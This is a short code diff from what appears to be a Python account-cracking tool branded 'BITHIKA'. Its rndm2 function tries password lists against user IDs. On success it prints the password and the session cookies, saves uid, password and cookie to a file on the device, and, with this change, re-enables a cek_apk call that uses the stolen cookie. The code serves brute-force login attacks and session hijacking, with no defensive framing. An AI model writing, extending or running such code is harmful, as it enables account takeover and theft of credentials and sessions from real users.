@@ -1043,7 +1043,7 @@ def rndm2(uid,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        #cek_apk(coki)
+                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
